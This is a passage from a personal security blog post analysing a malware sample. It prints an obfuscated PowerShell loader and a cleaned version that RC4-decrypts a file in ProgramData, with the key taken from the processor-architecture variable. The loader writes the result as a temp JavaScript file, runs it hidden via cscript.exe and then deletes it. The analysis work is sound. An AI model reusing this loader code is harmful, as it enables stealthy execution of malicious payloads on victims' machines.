</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span> <span class="nv">$DECoDEddaTa</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.CONVert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$bASe64dATA</span><span class="p">)</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="n">exit</span> <span class="mf">1</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span> <span class="nv">$DEcrYPTEddAta</span> <span class="p">=</span> <span class="n">UuZzxhNfzzykTVtsxxxYhNlHzaPpKKIbWqLloFdOT</span> <span class="n">-Key</span> <span class="nv">$kEybYtEs</span> <span class="n">-Data</span> <span class="nv">$DECoDEddaTa</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="n">exit</span> <span class="mf">1</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">         
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$MEMORYstreAM</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">MemoryStream</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$MEMORYstreAM</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$DEcrYPTEddAta</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$DEcrYPTEddAta</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$MEMORYstreAM</span><span class="p">.</span><span class="na">Position</span> <span class="p">=</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$GzipstreAm</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">SystEM</span><span class="p">.</span><span class="py">iO</span><span class="p">.</span><span class="py">CoMprEsSIon</span><span class="p">.</span><span class="py">GZIpsTrEaM</span><span class="p">(</span><span class="nv">$MEMORYstreAM</span><span class="p">,</span> <span class="p">[</span><span class="no">syStEM.io.compREssIOn.coMpRessiONmODE</span><span class="p">]::</span><span class="n">Decompress</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$outpUTStreAm</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">MemoryStream</span>
</span></span><span class="line"><span class="cl">         <span class="nv">$GzipstreAm</span><span class="p">.</span><span class="py">CopyTo</span><span class="p">(</span><span class="nv">$outpUTStreAm</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">$DECOmPReSsEDDATa</span> <span class="p">=</span> <span class="nv">$outpUTStreAm</span><span class="p">.</span><span class="py">ToArray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">         <span class="nv">$GzipstreAm</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nv">$MEMORYstreAM</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="n">exit</span> <span class="mf">1</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="nv">$TempDIr</span> <span class="p">=</span> <span class="p">[</span><span class="no">sYSTem.IO.PaTh</span><span class="p">]::</span><span class="n">GetTempPath</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nv">$temPFIle</span> <span class="p">=</span> <span class="nb">Join-Path</span> <span class="n">-Path</span> <span class="nv">$TempDIr</span> <span class="n">-ChildPath</span> <span class="s2">&#34;</span><span class="p">$([</span><span class="no">sySTEm.GuId</span><span class="p">]::</span><span class="n">NewGuid</span><span class="p">())</span><span class="s2">.js&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$D</span> <span class="p">=</span> <span class="p">[</span><span class="no">SYSTEM.Text.eNcoDINg</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$DECOmPReSsEDDATa</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">Set-Content</span> <span class="n">-Path</span> <span class="nv">$temPFIle</span> <span class="n">-Value</span> <span class="nv">$D</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="s2">&#34;cscript.exe&#34;</span> <span class="n">-ArgumentList</span> <span class="nv">$temPFIle</span> <span class="n">-WindowStyle</span> <span class="n">Hidden</span> 
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="nb">Start-Sleep</span> <span class="n">-Seconds</span> <span class="mf">10</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nb">Remove-Item</span> <span class="n">-Path</span> <span class="nv">$temPFIle</span> <span class="n">-Force</span>
</span></span></code></pre></div><p>Throw it into Copilot so it will deobfuscate and clean the whole thing for us:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="c"># Define variables with decoded values</span>
</span></span><span class="line"><span class="cl"><span class="nv">$part1</span> <span class="p">=</span> <span class="s2">&#34;Get&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$part2</span> <span class="p">=</span> <span class="s2">&#34;tByte&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$part3</span> <span class="p">=</span> <span class="s2">&#34;s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$combinedKey</span> <span class="p">=</span> <span class="nv">$part1</span> <span class="p">+</span> <span class="nv">$part2</span> <span class="p">+</span> <span class="nv">$part3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Define the file path and environment variable name</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filePath</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$Env:PROGRAMDATA</span><span class="s2">\CVR49A6.tmp.cvr&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$envVarName</span> <span class="p">=</span> <span class="s2">&#34;PROCESSOR_ARCHITECTURE&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Function to decrypt data using RC4 algorithm</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">Decrypt-RC4</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">param</span><span class="p">([</span><span class="no">Byte[]</span><span class="p">]</span><span class="nv">$key</span><span class="p">,</span> <span class="p">[</span><span class="no">Byte[]</span><span class="p">]</span><span class="nv">$data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$S</span> <span class="p">=</span> <span class="mf">0</span><span class="p">.</span><span class="mf">.255</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$j</span> <span class="p">=</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="mf">256</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$j</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="p">+</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">+</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="p">%</span> <span class="nv">$key</span><span class="p">.</span><span class="n">Length</span><span class="p">])</span> <span class="p">%</span> <span class="mf">256</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">],</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$i</span> <span class="p">=</span> <span class="nv">$j</span> <span class="p">=</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$n</span> <span class="p">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nv">$n</span> <span class="o">-lt</span> <span class="nv">$data</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="nv">$n</span><span class="p">++)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$i</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$i</span> <span class="p">+</span> <span class="mf">1</span><span class="p">)</span> <span class="p">%</span> <span class="mf">256</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$j</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$j</span> <span class="p">+</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="p">%</span> <span class="mf">256</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">],</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$k</span> <span class="p">=</span> <span class="nv">$S</span><span class="p">[(</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">+</span> <span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="p">%</span> <span class="mf">256</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span><span class="p">[</span><span class="nv">$n</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$data</span><span class="p">[</span><span class="nv">$n</span><span class="p">]</span> <span class="o">-bxor</span> <span class="nv">$k</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$data</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Get the key from the environment variable</span>
</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Environment</span><span class="p">]::</span><span class="n">GetEnvironmentVariable</span><span class="p">(</span><span class="nv">$envVarName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span> <span class="mf">1</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$keyBytes</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Check if the file exists</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">-Path</span> <span class="nv">$filePath</span><span class="p">))</span> <span class="p">{</span> <span class="n">exit</span> <span class="mf">1</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Read and decode the base64 data from the file</span>
</span></span><span class="line"><span class="cl"><span class="nv">$base64Data</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="nv">$filePath</span> <span class="n">-Raw</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$decodedData</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$base64Data</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="n">exit</span> <span class="mf">1</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Decrypt the data</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$decryptedData</span> <span class="p">=</span> <span class="nb">Decrypt-RC4</span> <span class="n">-Key</span> <span class="nv">$keyBytes</span> <span class="n">-Data</span> <span class="nv">$decodedData</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="n">exit</span> <span class="mf">1</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Decompress the decrypted data</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$memoryStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">MemoryStream</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$memoryStream</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$decryptedData</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$decryptedData</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$memoryStream</span><span class="p">.</span><span class="na">Position</span> <span class="p">=</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$gzipStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">Compression</span><span class="p">.</span><span class="py">GZipStream</span><span class="p">(</span><span class="nv">$memoryStream</span><span class="p">,</span> <span class="p">[</span><span class="no">System.IO.Compression.CompressionMode</span><span class="p">]::</span><span class="n">Decompress</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$outputStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">IO</span><span class="p">.</span><span class="py">MemoryStream</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$gzipStream</span><span class="p">.</span><span class="py">CopyTo</span><span class="p">(</span><span class="nv">$outputStream</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$decompressedData</span> <span class="p">=</span> <span class="nv">$outputStream</span><span class="p">.</span><span class="py">ToArray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$gzipStream</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$memoryStream</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="n">exit</span> <span class="mf">1</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Create a temporary file and write the decompressed data to it</span>
</span></span><span class="line"><span class="cl"><span class="nv">$tempDir</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.IO.Path</span><span class="p">]::</span><span class="n">GetTempPath</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nv">$tempFile</span> <span class="p">=</span> <span class="nb">Join-Path</span> <span class="n">-Path</span> <span class="nv">$tempDir</span> <span class="n">-ChildPath</span> <span class="s2">&#34;</span><span class="p">$([</span><span class="no">System.Guid</span><span class="p">]::</span><span class="n">NewGuid</span><span class="p">())</span><span class="s2">.js&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$decompressedString</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$decompressedData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">Set-Content</span> <span class="n">-Path</span> <span class="nv">$tempFile</span> <span class="n">-Value</span> <span class="nv">$decompressedString</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Execute the temporary file using cscript.exe</span>
</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="s2">&#34;cscript.exe&#34;</span> <span class="n">-ArgumentList</span> <span class="nv">$tempFile</span> <span class="n">-WindowStyle</span> <span class="n">Hidden</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Wait for 10 seconds and then remove the temporary file</span>
</span></span><span class="line"><span class="cl"><span class="nb">Start-Sleep</span> <span class="n">-Seconds</span> <span class="mf">10</span>
</span></span><span class="line"><span class="cl"><span class="nb">Remove-Item</span> <span class="n">-Path</span> <span class="nv">$tempFile</span> <span class="n">-Force</span>
</span></span></code></pre></div><p>The malware is taking data from <code>C:\ProgramData\CVR49A6.tmp.cvr</code> then RC4-decrypting -&gt; store the file at tempDir -&gt; executing the decrypted content with <code>cscript.exe</code>. One problem is that the key used for decrypting is the processor architecture the malware was built for. Mine was AMD64 and it wasn&rsquo;t able to decrypt the thing. Try with ARM64 and it works. Comment the last 3 lines so the JS is not executed and deleted. The dropped <a href="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/refs/heads/dev/public/posts/files/groupib_malware.js">JS file</a> is obsfucated. Just throw it into ChatGPT, it will do the preliminary analysis for us, we can spot the RC4 encrypting function in the code and from there we can deobsfucate other functions:</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/heckintosh" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
<a href="https://twitter.com/heckintosh_" target="_blank" rel="noopener noreferrer me"
    title="Twitter">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
    </path>
</svg>
</a>
<a href="https://linkedin.com/ducanhnguyen9" target="_blank" rel="noopener noreferrer me"
    title="Linkedin">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
    <rect x="2" y="9" width="4" height="12"></rect>
    <circle cx="4" cy="4" r="2"></circle>
</svg>
</a>
<a href="mailto:heckintosh@protonmail.com" target="_blank" rel="noopener noreferrer me"
    title="Email">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 21" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
    <polyline points="22,6 12,13 2,6"></polyline>
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2025 D.A Nguyen.
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
        theme on
        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    




    
    
        
    

    
    
        
    



    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
